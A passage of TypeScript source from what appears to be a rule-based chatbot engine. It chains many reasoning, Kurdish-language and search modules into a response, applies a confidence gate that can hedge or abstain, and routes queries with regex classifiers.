        }
      } catch (e) { moduleFailures.push('reasoningEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // CausalReasoner: for "why" questions
    if (this.causalReasoner && this.isCausalQuery(userMessage)) {
      try {
        const inference = this.causalReasoner.inferCausality(
          this.extractCause(userMessage),
          this.extractEffect(userMessage),
        )
        if (inference && inference.strength > 0.2) {
          smartAugmentation += `\n\n**Causal Analysis:** ${inference.explanation ?? `Causal link strength: ${(inference.strength * 100).toFixed(0)}%`}`
        }
      } catch (e) { moduleFailures.push('causalReasoner: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // PlanningEngine: for "how to" / planning queries
    if (this.planningEngine && this.isPlanningQuery(userMessage)) {
      try {
        const plan = this.planningEngine.createPlan(userMessage)
        if (plan && plan.steps.length > 0) {
          const planText = plan.steps.map((s, i) => `${i + 1}. ${s.description ?? s.action ?? ''}`).join('\n')
          if (planText.trim()) {
            smartAugmentation += `\n\n**Plan:**\n${planText}`
          }
        }
      } catch (e) { moduleFailures.push('planningEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // CreativeEngine: for creative tasks (write, generate, create)
    if (this.creativeEngine && this.isCreativeQuery(userMessage)) {
      try {
        const brainstorm = this.creativeEngine.brainstorm(userMessage)
        if (brainstorm && brainstorm.ideas.length > 0) {
          const bestIdea = brainstorm.bestIdea ?? brainstorm.ideas[0]
          if (bestIdea) {
            smartAugmentation += `\n\n**Creative Insight:** ${bestIdea.description ?? bestIdea.title ?? ''}`
          }
        }
      } catch (e) { moduleFailures.push('creativeEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // AbstractionEngine: for concept explanation queries
    if (this.abstractionEngine && this.isConceptQuery(userMessage)) {
      try {
        const concept = keywords.slice(0, 3).join(' ')
        const generalized = this.abstractionEngine.generalize([concept])
        if (generalized) {
          const desc = typeof generalized === 'object' && 'description' in generalized
            ? (generalized as { description?: string }).description
            : null
          if (desc) {
            smartAugmentation += `\n\n**Concept:** ${desc}`
          }
        }
      } catch (e) { moduleFailures.push('abstractionEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // AnalogicalReasoner: for comparison/analogy queries
    if (this.analogicalReasoner && this.isAnalogyQuery(userMessage)) {
      try {
        const analogy = this.analogicalReasoner.findAnalogy(keywords[0] ?? userMessage)
        if (analogy && analogy.explanation) {
          smartAugmentation += `\n\n**Analogy:** ${analogy.explanation}`
        }
      } catch (e) { moduleFailures.push('analogicalReasoner: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // KnowledgeSynthesizer: combine multiple knowledge sources
    if (this.knowledgeSynthesizer && knowledgeResults.length >= 2) {
      try {
        for (const kr of knowledgeResults.slice(0, 3)) {
          this.knowledgeSynthesizer.addSource({
            id: kr.entry.id,
            name: kr.entry.category,
            facts: [kr.entry.content],
            reliability: Math.min(1, kr.score / 5),
          })
        }
        const fused = this.knowledgeSynthesizer.fuseKnowledge()
        if (fused.novelInsights.length > 0) {
          const insight = fused.novelInsights[0]
          const insightText = typeof insight === 'string' ? insight : (insight?.description ?? '')
          if (insightText) {
            smartAugmentation += `\n\n**Synthesized Insight:** ${insightText}`
          }
        }
      } catch (e) { moduleFailures.push('knowledgeSynthesizer: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // HypothesisEngine: for observation/explanation queries
    if (this.hypothesisEngine && this.isHypothesisQuery(userMessage)) {
      try {
        const hypotheses = this.hypothesisEngine.generateHypotheses(userMessage)
        if (hypotheses.length > 0) {
          const topH = hypotheses[0]
          if (topH && topH.confidence > 0.2) {
            smartAugmentation += `\n\n**Hypothesis:** ${topH.statement} (confidence: ${(topH.confidence * 100).toFixed(0)}%)`
          }
        }
      } catch (e) { moduleFailures.push('hypothesisEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // EthicalReasoner: for ethical/moral dilemma queries
    if (this.ethicalReasoner && this.isEthicalQuery(userMessage)) {
      try {
        const analysis = this.ethicalReasoner.analyze(userMessage)
        if (analysis.confidence > 0.2) {
          smartAugmentation += `\n\n**Ethical Analysis:** ${analysis.overallAssessment}`
          if (analysis.recommendation) {
            smartAugmentation += `\n**Recommendation:** ${analysis.recommendation}`
          }
        }
      } catch (e) { moduleFailures.push('ethicalReasoner: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // TemporalReasoner: for time-based / sequence queries
    if (this.temporalReasoner && this.isTemporalQuery(userMessage)) {
      try {
        const causalOrder = this.temporalReasoner.inferCausalOrder()
        if (causalOrder.length > 0) {
          const topCausal = causalOrder[0]
          if (topCausal) {
            const cause = topCausal.possibleCauses[0]?.eventName ?? topCausal.eventName
            const effect = topCausal.possibleEffects[0]?.eventName ?? 'unknown'
            smartAugmentation += `\n\n**Temporal Insight:** ${cause} → ${effect} (event: ${topCausal.eventName})`
          }
        }
      } catch (e) { moduleFailures.push('temporalReasoner: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // ArgumentAnalyzer: for debate/argument/claim queries
    if (this.argumentAnalyzer && this.isArgumentQuery(userMessage)) {
      try {
        const fallacies = this.argumentAnalyzer.detectFallacies(userMessage)
        if (fallacies.length > 0) {
          const topFallacy = fallacies[0]
          if (topFallacy) {
            smartAugmentation += `\n\n**Logical Analysis:** Detected ${topFallacy.type} fallacy (severity: ${topFallacy.severity})`
          }
        }
        const biases = this.argumentAnalyzer.detectBias(userMessage)
        if (biases.length > 0) {
          const topBias = biases[0]
          if (topBias) {
            smartAugmentation += `\n**Bias Detection:** ${topBias.type} bias detected`
          }
        }
      } catch (e) { moduleFailures.push('argumentAnalyzer: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // NarrativeEngine: for story/explanation/walkthrough queries
    if (this.narrativeEngine && this.isNarrativeQuery(userMessage)) {
      try {
        const beat = this.narrativeEngine.generateStoryBeat(userMessage)
        if (beat && beat.text) {
          smartAugmentation += `\n\n**Narrative:** ${beat.text}`
        }
      } catch (e) { moduleFailures.push('narrativeEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // CoreferenceResolver: resolve pronouns from conversation history
    if (this.coreferenceResolver && this.conversationHistory.length > 1) {
      try {
        const history = this.conversationHistory.slice(-10).map(h => ({ role: h.role, content: h.content }))
        const corefResult = this.coreferenceResolver.resolve(userMessage, history)
        if (corefResult.replacements.length > 0 && corefResult.confidence > 0.5) {
          const topReplacement = corefResult.replacements[0]
          if (topReplacement) {
            smartAugmentation += `\n\n**Context Resolution:** "${topReplacement.pronoun}" refers to "${topReplacement.referent}"`
          }
        }
      } catch (e) { moduleFailures.push('coreferenceResolver: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // LanguageDetector: detect input language
    if (this.languageDetector) {
      try {
        const langResult = this.languageDetector.detect(userMessage)
        if (langResult.language !== 'en' && langResult.confidence > 0.6) {
          smartAugmentation += `\n\n**Language Detected:** ${langResult.language} (confidence: ${(langResult.confidence * 100).toFixed(0)}%)`
        }
      } catch (e) { moduleFailures.push('languageDetector: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // DialogueActRecognizer: classify user utterance type
    if (this.dialogueActRecognizer) {
      try {
        const actResult = this.dialogueActRecognizer.recognize(userMessage)
        if (actResult.confidence > 0.7 && actResult.act !== 'question') {
          smartAugmentation += `\n\n**Dialogue Act:** ${actResult.act}${actResult.subType ? ` (${actResult.subType})` : ''}`
        }
      } catch (e) { moduleFailures.push('dialogueActRecognizer: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // QueryDecomposer: decompose complex questions
    if (this.queryDecomposer) {
      try {
        const decomposition = this.queryDecomposer.decompose(userMessage)
        if (decomposition.isComplex && decomposition.subQuestions.length > 1) {
          const subQList = decomposition.subQuestions.map(sq => `• ${sq.question}`).join('\n')
          smartAugmentation += `\n\n**Query Decomposition** (${decomposition.strategy}):\n${subQList}`
        }
      } catch (e) { moduleFailures.push('queryDecomposer: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // CrossDomainTransfer: combine knowledge across domains
    if (this.crossDomainTransfer && knowledgeResults.length > 0) {
      try {
        const matchedDomains = [...new Set(knowledgeResults.map(kr => kr.category))]
        if (matchedDomains.length > 1) {
          const crossResult = this.crossDomainTransfer.detectCrossDomain(userMessage, matchedDomains)
          if (crossResult.isCrossDomain && crossResult.confidence > 0.5) {
            smartAugmentation += `\n\n**Cross-Domain:** ${crossResult.primaryDomain} ↔ ${crossResult.secondaryDomains.join(', ')} (${crossResult.transferStrategy})`
          }
        }
      } catch (e) { moduleFailures.push('crossDomainTransfer: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // CounterfactualReasoner: handle "what if" scenarios
    if (this.counterfactualReasoner && this.counterfactualReasoner.isCounterfactual(userMessage)) {
      try {
        const cfResult = this.counterfactualReasoner.analyze(userMessage)
        if (cfResult.isCounterfactual && cfResult.confidence > 0.5) {
          const implications = cfResult.implications.slice(0, 3).map(i => `• ${i}`).join('\n')
          smartAugmentation += `\n\n**Counterfactual Analysis:**\nPremise: ${cfResult.premise}\n${implications}`
          if (cfResult.risks.length > 0) {
            smartAugmentation += `\nRisks: ${cfResult.risks[0]}`
          }
        }
      } catch (e) { moduleFailures.push('counterfactualReasoner: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // UserProfileModel: track user preferences and adapt
    if (this.userProfileModel) {
      try {
        const topDomain = knowledgeResults.length > 0 ? knowledgeResults[0]!.category : 'general'
        this.userProfileModel.updateFromInteraction(userMessage, topDomain)
      } catch (e) { moduleFailures.push('userProfileModel: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // ConversationSummarizer: track conversation
    if (this.conversationSummarizer) {
      try {
        this.conversationSummarizer.addTurn('user', userMessage)
      } catch (e) { moduleFailures.push('conversationSummarizer: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // Kurdish NLP: morphology, sentiment, translation for Kurdish queries
    if (this.isKurdishSoraniQuery(userMessage)) {
      // Kurdish Sentiment Analysis
      if (this.kurdishSentiment) {
        try {
          const sentimentResult: SentimentResult = this.kurdishSentiment.analyzeSentiment(userMessage)
          if (sentimentResult.confidence > 0.3) {
            smartAugmentation += `\n\n**Kurdish Sentiment:** ${sentimentResult.label} (${sentimentResult.dominantEmotion}, confidence: ${(sentimentResult.confidence * 100).toFixed(0)}%)`
          }
        } catch (e) { moduleFailures.push('kurdishSentiment: ' + (e instanceof Error ? e.message : String(e))) }
      }

      // Kurdish Morphological Analysis (for single-word or short Kurdish text queries)
      if (this.kurdishMorphology && /[\u0626-\u06FF]/.test(userMessage)) {
        try {
          const words = userMessage.split(/\s+/).filter(w => /[\u0626-\u06FF]/.test(w))
          const morphResults = words.slice(0, 3).map(w => {
            const analysis = this.kurdishMorphology!.analyze(w)
            return analysis.root !== w ? `${w} → root: ${analysis.root} (${analysis.pos})` : null
          }).filter(Boolean)
          if (morphResults.length > 0) {
            smartAugmentation += `\n\n**Morphological Analysis:** ${morphResults.join('; ')}`
          }
        } catch (e) { moduleFailures.push('kurdishMorphology: ' + (e instanceof Error ? e.message : String(e))) }
      }

      // Kurdish Translation Corpus — find relevant parallel sentences
      if (this.kurdishCorpus) {
        try {
          const searchTerms = userMessage.replace(/[\u0626-\u06FF]/g, '').trim() || userMessage
          const translations = this.kurdishCorpus.search(searchTerms)
          if (translations.length > 0) {
            const top = translations[0]!
            smartAugmentation += `\n\n**Translation Example:** ${top.ckb} → ${top.eng}`
          }
        } catch (e) { moduleFailures.push('kurdishCorpus: ' + (e instanceof Error ? e.message : String(e))) }
      }
    }

    // ── Generate base response (uses TF-IDF if enabled) ──────────────────────
    let text = this.config.useTfIdf
      ? this.buildResponseWithTfIdf(intent, userMessage, knowledgeResults)
      : buildResponse(
          intent, userMessage, knowledgeResults,
          this.learnedPatterns, this.conversationHistory,
          this.config.creativity,
        )

    // Append smart augmentation to base response
    if (smartAugmentation) {
      text += smartAugmentation
    }

    // MultiFormatGenerator: adapt output format
    if (this.multiFormatGenerator) {
      try {
        const formatDetection = this.multiFormatGenerator.detectFormat(userMessage)
        if (formatDetection.recommendedFormat !== 'plain' && formatDetection.confidence > 0.6) {
          text = this.multiFormatGenerator.format(text, formatDetection.recommendedFormat)
        }
      } catch (e) { moduleFailures.push('multiFormatGenerator: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // ResponseQualityScorer: self-evaluate and flag low quality
    if (this.responseQualityScorer) {
      try {
        const qualityScore = this.responseQualityScorer.score(userMessage, text)
        if (qualityScore.overall < 0.3 && qualityScore.flags.length > 0) {
          text += `\n\n*Note: This response may be incomplete. ${qualityScore.flags[0]}*`
        }
      } catch (e) { moduleFailures.push('responseQualityScorer: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // ConversationSummarizer: track assistant response
    if (this.conversationSummarizer) {
      try {
        this.conversationSummarizer.addTurn('assistant', text)
      } catch (e) { moduleFailures.push('conversationSummarizer: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // AnomalyDetector: detect unusual query patterns
    if (this.anomalyDetector) {
      try {
        const anomalyResult = this.anomalyDetector.detectQueryAnomaly(userMessage)
        if (anomalyResult.isAnomaly && anomalyResult.score > 0.5) {
          smartAugmentation += `\n\n**⚠ Pattern Note:** ${anomalyResult.description}`
        }
      } catch (e) { moduleFailures.push('anomalyDetector: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // EmotionalIntelligence: analyze emotional content and adapt
    if (this.emotionalIntelligence) {
      try {
        const emotionResult = this.emotionalIntelligence.analyzeEmotion(userMessage)
        if (emotionResult.frustrationLevel > 0.5) {
          const empathyPrefix = this.emotionalIntelligence.generateEmpathyResponse(emotionResult)
          if (empathyPrefix && !text.startsWith(empathyPrefix)) {
            text = empathyPrefix + '\n\n' + text
          }
        }
      } catch (e) { moduleFailures.push('emotionalIntelligence: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // ContextualMemoryEngine: store interaction for contextual recall
    if (this.contextualMemoryEngine) {
      try {
        const topDomain = knowledgeResults.length > 0 ? knowledgeResults[0]!.category : 'general'
        this.contextualMemoryEngine.store(
          userMessage,
          { domain: topDomain, topic: topDomain },
          0.5,
          ['conversation']
        )
      } catch (e) { moduleFailures.push('contextualMemoryEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // LogicalProofEngine: detect logical fallacies in queries
    if (this.logicalProofEngine) {
      try {
        const fallacyResult = this.logicalProofEngine.detectFallacies(userMessage)
        if (fallacyResult.hasFallacy && fallacyResult.fallacies.length > 0) {
          const topFallacy = fallacyResult.fallacies[0]!
          smartAugmentation += `\n\n**🔍 Logic Note:** Potential ${topFallacy.name} detected — ${topFallacy.description}`
        }
      } catch (e) { moduleFailures.push('logicalProofEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // CreativeProblemSolver: suggest creative approaches for problem-solving queries
    if (this.creativeProblemSolver) {
      try {
        const lowerMsg = userMessage.toLowerCase()
        if (lowerMsg.includes('how to solve') || lowerMsg.includes('creative') ||
            lowerMsg.includes('innovate') || lowerMsg.includes('brainstorm') ||
            lowerMsg.includes('think outside')) {
          const ideas = this.creativeProblemSolver.brainstorm(userMessage, 3)
          if (ideas.length > 0) {
            smartAugmentation += `\n\n**💡 Creative Angles:**\n${ideas.map((idea, i) => `${i + 1}. ${idea}`).join('\n')}`
          }
        }
      } catch (e) { moduleFailures.push('creativeProblemSolver: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // AdvancedSearchEngine: multi-strategy search with thinking for search/find queries
    if (this.advancedSearchEngine) {
      try {
        const lowerMsg = userMessage.toLowerCase()
        if (lowerMsg.includes('search') || lowerMsg.includes('find') ||
            lowerMsg.includes('look up') || lowerMsg.includes('lookup') ||
            intent === 'search') {
          // Feed conversation context to the search engine
          this.advancedSearchEngine.addConversationContext(userMessage)
          // Feed semantic graph nodes (only if graph is currently empty to avoid duplicates)
          if (this.semanticMemory && this.advancedSearchEngine.getGraphNodeCount() === 0) {
            const concepts = this.semanticMemory.getConceptsByDomain('programming')
            for (const concept of concepts.slice(0, 50)) {
              this.advancedSearchEngine.addGraphNode(concept.id, concept.name, concept.domain)
            }
          }
          const searchResult = this.advancedSearchEngine.searchWithThinking(userMessage)
          if (searchResult.results.length > 0) {
            // Learn from search results so the brain gets smarter over time
            if (this.config.enableAutoLearning && this.config.learningEnabled) {
              this.learnFromSearchResults(userMessage, searchResult)
            }

            const thinkingReport = searchResult.thinkingSteps
              .map(s => `${s.step}. [${s.strategy}] ${s.thought} — ${s.detail}`)
              .join('\n')
            const topResults = searchResult.results.slice(0, 3)
              .map((r, i) => formatSearchResultLine(r, i))
              .join('\n')
            smartAugmentation += `\n\n**🔍 Advanced Search (${searchResult.strategiesUsed.length} strategies, ${(searchResult.confidence * 100).toFixed(0)}% confidence):**\n\n*Thinking process:*\n${thinkingReport}\n\n*Top results:*\n${topResults}`
          }
        }
      } catch (e) { moduleFailures.push('advancedSearchEngine: ' + (e instanceof Error ? e.message : String(e))) }
    }

    // ── ConfidenceGate: quality control ──────────────────────────────────────
    let gateConfidence = 0.5
    if (this.confidenceGate) {
      const signals: ConfidenceSignal[] = [
        {
          source: 'knowledge-match',
          score: knowledgeResults.length > 0 ? Math.min(1, knowledgeResults[0]!.score / 5) : 0.1,
          weight: 0.4,
          reason: knowledgeResults.length > 0 ? `Top KB match score: ${knowledgeResults[0]!.score}` : 'No KB matches',
        },
        {
          source: 'pattern-match',
          score: this.learnedPatterns.length > 0 ? 0.6 : 0.2,
          weight: 0.3,
          reason: `${this.learnedPatterns.length} learned patterns available`,
        },
        {
          source: 'intent-clarity',
          score: intent !== 'general' ? 0.8 : 0.3,
          weight: 0.3,
          reason: `Intent: ${intent}`,
        },
      ]

      const gateResult = this.confidenceGate.evaluate(signals)
      gateConfidence = gateResult.aggregateConfidence
      this.lastGateDecision = gateResult.decision

      if (gateResult.decision === 'abstain' && gateResult.abstainMessage) {
        text = gateResult.abstainMessage
      } else if (gateResult.decision === 'hedge' && gateResult.hedgePrefix) {
        text = gateResult.hedgePrefix + text
      }
    }
    this.lastConfidenceAssessment = gateConfidence

    // Update knowledge use counts
    for (const result of knowledgeResults) {
      result.entry.useCount++
    }

    // Track assistant response in ContextManager
    if (this.contextManager) {
      this.contextManager.addTurn({ role: 'assistant', content: text, timestamp: Date.now() })
    }

    // Record outcome in MetaCognition for calibration
    if (this.metaCognition) {
      const assessment = this.metaCognition.assessConfidence(userMessage, text)
      this.metaCognition.recordOutcome(assessment.calibrated, knowledgeResults.length > 0 ? 0.8 : 0.3)
    }

    // SemanticTrainer: incrementally learn from this conversation turn
    if (this.semanticTrainer) {
      this.semanticTrainer.learnFromText(userMessage)
      this.semanticTrainer.learnFromText(text)
    }

    // TopicModeler: track conversation topics
    if (this.topicModeler) {
      const docId = `chat-${Date.now()}`
      this.topicModeler.addDocument(docId, `${userMessage} ${text}`)
    }

    // ── Auto-Learning: reinforce patterns from successful KB matches ─────────
    if (this.config.enableAutoLearning && this.config.learningEnabled) {
      this.autoLearnFromConversation(userMessage, text, knowledgeResults, gateConfidence)
    }

    // ── Memory Consolidation: periodic transfer to long-term memory ──────────
    this.chatTurnsSinceConsolidation++
    if (this.memoryConsolidator && this.chatTurnsSinceConsolidation >= this.config.memoryConsolidationInterval) {
      const recentTurns: SessionTurn[] = this.conversationHistory
        .slice(-this.config.memoryConsolidationInterval * 2)
        .map(m => ({
          role: m.role as 'user' | 'assistant',
          content: typeof m.content === 'string' ? m.content : '',
          timestamp: Date.now(),
        }))
      this.memoryConsolidator.consolidate(recentTurns)
      this.chatTurnsSinceConsolidation = 0
    }

    this.conversationHistory.push({ role: 'assistant', content: text })
    this.stats.totalChats++
    this.stats.lastUsedAt = new Date().toISOString()

    // ── Enforce maxResponseLength with chunking ──────────────────────────────
    let finalText = text
    if (text.length > this.config.maxResponseLength) {
      finalText = this.tokenBudget.chunkResponse(text, this.config.maxResponseLength)
    }

    const durationMs = Date.now() - start

    // Simulate token usage (approximate: ~4 chars per token)
    const inputTokens = Math.ceil(userMessage.length / 4)
    const outputTokens = Math.ceil(finalText.length / 4)

    // Track in budget manager
    this.tokenBudget.trackUsage({ inputTokens, outputTokens })

    // Append budget message if nearing limit
    const budgetMsg = this.tokenBudget.getBudgetMessage()
    if (budgetMsg) {
      finalText += budgetMsg
    }

    return {
      text: finalText,
      usage: { inputTokens, outputTokens, cacheReadTokens: 0, cacheCreationTokens: 0 },
      durationMs,
      ...this.getBudgetFields(),
      ...(moduleFailures.length > 0 ? { moduleFailures } : {}),
    }
  }

  /** Build response using TF-IDF scoring for better pattern matching. */
  private buildResponseWithTfIdf(
    intent: string,
    userMessage: string,
    knowledgeResults: KnowledgeSearchResult[],
  ): string {
    // Score learned patterns using TF-IDF
    if (this.learnedPatterns.length > 0) {
      // Rebuild TF-IDF index
      this.rebuildTfIdfIndex()

      const tfidfResults = this.tfidfScorer.score(userMessage, 5, 0.05)

      if (tfidfResults.length > 0) {
        // Check for conflicts (multiple patterns with similar scores)
        const topScore = tfidfResults[0]!.score
        const closeMatches = tfidfResults.filter(r => r.score >= topScore * 0.9)

        if (closeMatches.length > 1) {
          // Conflict resolution: prefer higher priority, then reinforcements, then recency
          const resolved = this.resolveConflict(closeMatches.map(r => {
            const pattern = this.learnedPatterns.find(p => `pattern-${p.inputPattern}` === r.id)
            return { pattern: pattern!, score: r.score }
          }).filter(r => r.pattern))

          if (resolved) {
            resolved.lastUsed = new Date().toISOString()
            return resolved.response
          }
        }

        // Use top match
        const topMatch = tfidfResults[0]!
        const pattern = this.learnedPatterns.find(p => `pattern-${p.inputPattern}` === topMatch.id)
        if (pattern && pattern.confidence >= this.config.minConfidence) {
          pattern.lastUsed = new Date().toISOString()
          return pattern.response
        }
      }
    }

    // Fall back to standard response building
    return buildResponse(
      intent, userMessage, knowledgeResults,
      this.learnedPatterns, this.conversationHistory,
      this.config.creativity,
    )
  }

  /** Rebuild the TF-IDF index from learned patterns. */
  private rebuildTfIdfIndex(): void {
    this.tfidfScorer.clear()
    for (const pattern of this.learnedPatterns) {
      this.tfidfScorer.addDocument({
        id: `pattern-${pattern.inputPattern}`,
        text: pattern.inputPattern,
      })
    }
  }

  /** Resolve conflicts between patterns with similar scores. */
  private resolveConflict(
    candidates: Array<{ pattern: LearnedPattern; score: number }>,
  ): LearnedPattern | null {
    if (candidates.length === 0) return null
    if (candidates.length === 1) return candidates[0]!.pattern

    // Sort by: priority (desc) → reinforcements (desc) → recency (desc)
    candidates.sort((a, b) => {
      const priorityDiff = (PRIORITY_WEIGHTS[b.pattern.priority] ?? 1) - (PRIORITY_WEIGHTS[a.pattern.priority] ?? 1)
      if (priorityDiff !== 0) return priorityDiff

      const reinforceDiff = b.pattern.reinforcements - a.pattern.reinforcements
      if (reinforceDiff !== 0) return reinforceDiff

      return new Date(b.pattern.lastUsed).getTime() - new Date(a.pattern.lastUsed).getTime()
    })

    return candidates[0]!.pattern
  }

  /** Apply confidence decay to unused patterns. Prune below minConfidence. */
  private applyConfidenceDecay(): void {
    if (this.config.decayRate <= 0) return

    const now = Date.now()
    const dayMs = 24 * 60 * 60 * 1000

    this.learnedPatterns = this.learnedPatterns.filter(pattern => {
      const daysSinceUse = (now - new Date(pattern.lastUsed).getTime()) / dayMs
      if (daysSinceUse < 1) return true  // Skip decay for recently used patterns

      // Decay: confidence *= (1 - decayRate * daysSinceLastUse)
      // Reinforcement count slows decay
      const effectiveDecay = this.config.decayRate / (1 + pattern.reinforcements * 0.1)
      pattern.confidence *= (1 - effectiveDecay * daysSinceUse)
      pattern.confidence = Math.max(0, pattern.confidence)

      // Prune below minimum confidence
      return pattern.confidence >= this.config.minConfidence
    })
  }

  // ── Smart Query Classifiers ──────────────────────────────────────────────────

  /** Check if a query requires multi-step reasoning. */
  private isComplexQuery(msg: string): boolean {
    const lower = msg.toLowerCase()
    return /\b(why|how|compare|difference|between|versus|vs|explain.+and|what.+if|analyze|evaluate|trade-?off|prove|derive|calculate|solve|compute|what happens when|relationship between)\b/.test(lower)
      && msg.split(/\s+/).length > 5
  }

  /** Check if query asks about causation. */
  private isCausalQuery(msg: string): boolean {
    return /\b(why\s+(does|do|is|are|did|would|can|should)|what\s+causes?|because\s+of|reason\s+for|leads?\s+to|results?\s+in|what\s+happens\s+(when|if)|what\s+is\s+the\s+effect)\b/i.test(msg)
  }

  /** Check if query asks for a plan or steps. */
  private isPlanningQuery(msg: string): boolean {
    return /\b(how\s+(do|can|should|to|would)\s+i|steps?\s+(to|for)|plan\s+(to|for)|guide\s+(to|for|on)|walkthrough|tutorial|how\s+to\s+(solve|prove|calculate|derive|integrate|differentiate))\b/i.test(msg)
  }

  /** Check if query asks for creative generation. */
  private isCreativeQuery(msg: string): boolean {
    return /\b(write\s+a|generate|create|compose|draft|brainstorm|imagine|design\s+a|come\s+up\s+with)\b/i.test(msg)
  }

  /** Check if query asks about a concept. */
  private isConceptQuery(msg: string): boolean {
    return /\b(what\s+is|explain|define|describe|meaning\s+of|concept\s+of|what\s+are|what\s+does.+mean|difference\s+between|how\s+does.+work)\b/i.test(msg)
  }

  /** Check if query asks for analogy/comparison. */
  private isAnalogyQuery(msg: string): boolean {
    return /\b(like|similar\s+to|analogy|compared?\s+to|resembles?|equivalent|is.+the\s+same\s+as)\b/i.test(msg)
  }

  /** Check if query is a math/physics/logic problem to solve. */
  private isMathPhysicsLogicQuery(msg: string): boolean {
    // Math terms
    const mathPattern = /\b(solve|calculate|compute|derive|integrate|differentiate|simplify|factor|evaluate|prove|what\s+is\s+\d|find\s+(the|x|y)|equation|formula|theorem)\b/i
    // Physics terms
    const physicsPattern = /\b(law\s+of|newton|euler|gauss|force|energy|momentum|velocity|acceleration|voltage|current|resistance|probability)\b/i
    // Linear algebra terms
    const linalgPattern = /\b(matrix|vector|determinant|eigenvalue)\b/i
    // Calculus terms
    const calculusPattern = /\b(limit|derivative|integral|series|converge|diverge)\b/i
    // Logic terms
    const logicPattern = /\b(truth\s+table|valid|tautology|contradiction|syllogism|fallacy)\b/i

    return mathPattern.test(msg) || physicsPattern.test(msg) || linalgPattern.test(msg) || calculusPattern.test(msg) || logicPattern.test(msg)
  }

  /** Check if query is about Kurdish Sorani language. */
  private isKurdishSoraniQuery(msg: string): boolean {
    const kurdishPattern = /\b(kurdish|sorani|kurmanji|kurdistan|kurd|erbil|sulaymaniyah|hawler|silêmanî|kirkuk|sanandaj)\b/i
    const scriptPattern = /[\u0626-\u06FF\u0750-\u077F\uFB50-\uFDFF\uFE70-\uFEFF]/ // Arabic/Kurdish script
    const topicPattern = /\b(sorani\s+(alphabet|grammar|verb|noun|pronoun|adjective|vowel|consonant|phrase|word|sentence|number|greet|family|color|food|time|nature|emotion|idiom|phonolog|dialect|semantic|compound|ezafe|ergativ|passive|causative|conditional|modal|adverb|conjunction|negat|aspect|clitic|morpholog|derivat|loanword|pragmatic|discourse|evidential|metaphor|proverb|poetry|kinship|register|reduplicat|synonym|antonym|onomatop|profession|animal|weather|travel|health|technolog|sport|music|cloth|house|shop|direction|city|religion|bazaar|conversation|restaurant|shopping|social media|science|medical|legal|political|education|agriculture|commerce|literature|folk tale|relative clause|reported speech|subjunctive|geography|festival|newroz|transportation|translat|corpus|parallel|sentence pair|news headline|human rights|vocabulary corpus|sentiment))\b/i
    const learnPattern = /\b(learn\s+kurdish|learn\s+sorani|kurdish\s+(language|alphabet|grammar|vocabulary|phrase|word|writing|script|culture|poetry|music|proverb|idiom|history|geography|festival|clothing|food|politics|religion|literature|science|technology|media|translat|corpus|parallel|sentence|sentiment|morpholog))\b/i
    const translatePattern = /\b(in\s+kurdish|in\s+sorani|kurdish\s+for|sorani\s+for|translate.+kurdish|how\s+to\s+say.+kurdish|ckb.eng|kurdish.english\s+(translat|parallel|corpus)|sorani.english\s+(translat|parallel|corpus))\b/i
    const sentimentPattern = /\b(kurdish\s+sentiment|sorani\s+sentiment|sentiment.+kurdish|sentiment.+sorani|kurdish\s+emotion|sorani\s+emotion)\b/i

    return kurdishPattern.test(msg) || scriptPattern.test(msg) || topicPattern.test(msg) || learnPattern.test(msg) || translatePattern.test(msg) || sentimentPattern.test(msg)
  }

  /** Check if query involves hypothesis generation or testing. */
  private isHypothesisQuery(msg: string): boolean {
    return /\b(hypothes[ie]s|what\s+if|suppose|assume|could\s+it\s+be|theory|predict|observation|explain\s+why|possible\s+(explanation|reason|cause)|might\s+be\s+(because|due|caused)|what\s+would\s+happen)\b/i.test(msg)
  }

  /** Check if query involves ethical or moral reasoning. */
  private isEthicalQuery(msg: string): boolean {
    return /\b(ethic|moral|right\s+or\s+wrong|should\s+i|is\s+it\s+(right|wrong|fair|just|ethical)|dilemma|fairness|justice|responsib|duty|consequen|virtue|harm|principle|values|integrity)\b/i.test(msg)
  }

  /** Check if query is about trading programming (MT4/MT5/Pine Script). */
  private isTradingProgrammingQuery(msg: string): boolean {
    const platformPattern = /\b(mt[45]\s+programming|mql[45]|metatrader\s*[45]|pine\s+script|tradingview\s+(cod|program|script|indicator|strategy))\b/i
    const conceptPattern = /\b(expert\s+advisor|custom\s+indicator\s+(mql|mt|trading)|trading\s+(bot|algorithm|system)\s+(design|develop|code|program|build)|algorithmic\s+trading\s+(code|program|develop)|order\s*send|ctrade\s+class|strategy\.\s*(entry|exit|close)|alert\s*condition|indicator\s+buffer|backtest\s+(ea|expert|strategy|mql|pine)|candlestick\s+pattern\s+(detect|code|program)|divergence\s+(detect|code|program)|atr.based\s+stop)/i
